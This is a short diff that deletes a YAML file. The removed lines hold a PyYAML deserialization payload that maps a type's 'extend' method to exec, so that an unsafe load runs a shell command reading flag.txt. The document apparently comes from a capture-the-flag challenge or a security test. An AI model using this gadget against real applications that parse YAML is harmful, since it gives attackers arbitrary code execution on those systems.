@@ -1,3 +1,0 @@
-!!python/object/new:type
-  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
-  listitems: "import os; os.system('cat flag.txt')"
